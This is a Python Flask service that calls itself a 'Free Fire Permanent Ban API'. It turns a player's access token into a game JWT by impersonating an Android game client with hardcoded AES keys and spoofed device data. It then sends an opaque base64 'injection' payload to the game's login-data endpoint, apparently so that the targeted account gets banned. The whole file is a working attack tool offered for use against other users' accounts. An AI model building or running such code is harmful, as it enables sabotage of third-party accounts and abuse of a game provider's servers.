"""
Free Fire Permanent Ban API - Flask Application
Endpoints:
  GET  /access_token_ban?token=<access_token>
  GET  /jwt_ban?token=<jwt_token>
"""
import sys
import json
import time
import base64
import types
import requests
import urllib3
from datetime import datetime
from flask import Flask, request, jsonify

urllib3.disable_warnings()

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder

# ============================================================
#  Inline Protobuf Modules
# ============================================================
if 'MajoRLogin_pb2' not in sys.modules:
    _majr_req = types.ModuleType('MajoRLogin_pb2')
    _g1 = _majr_req.__dict__
    _d1 = _descriptor_pool.Default().AddSerializedFile(
        b'\n\x13MajorLoginReq.proto"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3'
    )
    _builder.BuildMessageAndEnumDescriptors(_d1, _g1)
    _builder.BuildTopDescriptorsAndMessages(_d1, 'MajoRLogin_pb2', _g1)
    sys.modules['MajoRLogin_pb2'] = _majr_req

if 'MajorLoginRes_pb2' not in sys.modules:
    _majr_res = types.ModuleType('MajorLoginRes_pb2')
    _g2 = _majr_res.__dict__
    _d2 = _descriptor_pool.Default().AddSerializedFile(
        b'\n\x13MajorLoginRes.proto"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3'
    )
    _builder.BuildMessageAndEnumDescriptors(_d2, _g2)
    _builder.BuildTopDescriptorsAndMessages(_d2, 'MajorLoginRes_pb2', _g2)
    sys.modules['MajorLoginRes_pb2'] = _majr_res

import MajoRLogin_pb2 as mLpB
import MajorLoginRes_pb2 as mLrPb

# ============================================================
#  Constants
# ============================================================
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ppmainecoonghj.com/MajorLogin"

mLhDr  = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB55"
}

# ============================================================
#  Core Logic
# ============================================================
def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            decrypted_bytes.append(byte ^ key[i % len(key)])
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None

    oId = None
    try:
        r = requests.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}",
            headers={"User-Agent": "Mozilla/5.0"}, timeout=8
        ).json()
        oId = r.get("open_id")
    except Exception:
        pass

    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get(
                "https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                headers=uid_headers, verify=False, timeout=8
            ).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post(
                    "https://topup.pk/api/auth/player_id_login",
                    headers={"Content-Type": "application/json"},
                    json={"app_id": 100067, "login_id": str(uid)},
                    verify=False, timeout=8
                ).json()
                oId = openid_res.get("open_id")
        except Exception:
            pass

    if not oId:
        return None, "Failed to extract Open ID. Token is invalid or expired."

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=15, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except Exception:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except Exception:
            continue

    return None, "MajorLogin failed. Account might be blocked or platform mismatch."

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_part).decode('utf-8'))
    except Exception:
        return {}

def get_base_url(lock_region):
    lock_region = (lock_region or '').upper()
    if lock_region == "IND":
        return "https://client.ind.freefiremobile.com"
    elif lock_region in ["BR", "US", "NA", "SAC"]:
        return "https://client.us.freefiremobile.com"
    return "https://clientbp.ggpolarbear.com"

def trigger_injection(jwt_token, version, base_url):
    api_url = f"{base_url}/GetLoginData"
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    return requests.post(api_url, headers=headers, data=base64.b64decode(BODY_BASE64),
                          timeout=20, verify=False)


# ============================================================
#  Flask App
# ============================================================
app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False


def _meta():
    return {
        "owner": "@KHAN",
        "developer": "@KHAN",
        "co_developer": "@KHAN",
        "team": "KHAN FF BAN TEAM",
        "telegram": "https://t.me/KHAN",
        "powered_by": "KHAN ENGINE"
    }


def _extract_token():
    tok = request.args.get('token') or request.args.get('access_token') or request.args.get('jwt')
    if not tok and request.method == 'POST':
        data = request.get_json(silent=True) or {}
        tok = data.get('token') or data.get('access_token') or data.get('jwt')
        if not tok:
            tok = request.form.get('token') or request.form.get('access_token') or request.form.get('jwt')
    return (tok or '').strip()


def _process_ban(jwt_token):
    start = time.time()
    user_data = decode_jwt(jwt_token)
    nickname = decode_ff_name(user_data.get('nickname', ''))
    region = user_data.get('lock_region', user_data.get('region', 'IND'))
    account_id = user_data.get('account_id', 'Unknown')
    version = user_data.get('release_version', 'Latest')
    base_url = get_base_url(region)

    try:
        resp = trigger_injection(jwt_token, version, base_url)
    except requests.exceptions.RequestException as e:
        elapsed = round(time.time() - start, 2)
        return jsonify({
            "success": False,
            "status": "FAILED",
            "message": "Server request failed",
            "error": str(e),
            "ban_type": "PERMANENT BAN",
            "time_taken": f"{elapsed}s",
            "target": {"nickname": nickname, "account_id": account_id, "region": region},
            "meta": _meta()
        }), 502

    elapsed = round(time.time() - start, 2)

    if resp.status_code == 200:
        return jsonify({
            "success": True,
            "status": "SUCCESS",
            "message": "ACCOUNT PERMANENTLY BANNED",
            "ban_type": "PERMANENT BAN",
            "ban_duration": "PERMANENT (NEVER EXPIRES)",
            "time_taken": f"{elapsed}s",
            "target": {
                "nickname": nickname,
                "account_id": account_id,
                "region": region,
                "version": version,
                "ban_status": "100% SUSPENDED"
            },
            "meta": _meta()
        }), 200
    else:
        return jsonify({
            "success": False,
            "status": "FAILED",
            "message": "Payload rejected by server",
            "ban_type": "PERMANENT BAN",
            "time_taken": f"{elapsed}s",
            "http_code": resp.status_code,
            "target": {"nickname": nickname, "account_id": account_id, "region": region},
            "meta": _meta()
        }), 400


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "success": True,
        "app": "KHAN FREE FIRE PERMANENT BAN API",
        "status": "ONLINE",
        "owner": "@KHAN",
        "developer": "@KHAN",
        "endpoints": {
            "/access_token_ban?token=<ACCESS_TOKEN>": "Ban via access token",
            "/jwt_ban?token=<JWT_TOKEN>": "Ban via JWT"
        },
        "meta": _meta()
    })


@app.route('/access_token_ban', methods=['GET', 'POST'])
def access_token_ban():
    token = _extract_token()
    if not token:
        return jsonify({"success": False, "error": "Token required", "meta": _meta()}), 400

    start = time.time()
    jwt_token, err = fetch_majorlogin_jwt(token)
    if not jwt_token:
        return jsonify({
            "success": False,
            "error": err or "Auth failed",
            "time_taken": f"{round(time.time() - start, 2)}s",
            "meta": _meta()
        }), 401

    return _process_ban(jwt_token)


@app.route('/jwt_ban', methods=['GET', 'POST'])
def jwt_ban():
    token = _extract_token()
    if not token:
        return jsonify({"success": False, "error": "Token required", "meta": _meta()}), 400
    return _process_ban(token)


@app.errorhandler(404)
def not_found(e):
    return jsonify({"success": False, "error": "Endpoint not found", "meta": _meta()}), 404


@app.errorhandler(500)
def server_error(e):
    return jsonify({"success": False, "error": "Internal error", "meta": _meta()}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)